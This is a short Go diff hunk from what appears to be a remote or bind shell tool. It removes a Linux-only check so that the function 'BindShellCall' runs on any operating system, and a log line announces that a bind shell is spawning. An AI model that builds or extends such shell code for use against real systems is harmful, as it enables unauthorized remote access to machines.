@@ -185,12 +185,7 @@ func CallBindLogic(callAddress string, osRuntime string) {
 
 	log.Printf("[*] Bind shell spawning, connecting to %s", callAddress)
 
-	switch osRuntime {
-	case "linux":
-		BindShellCall(caller)
-	default:
-		log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
-	}
+	BindShellCall(caller)
 }
 
 func BindShellCall(caller net.Conn) {
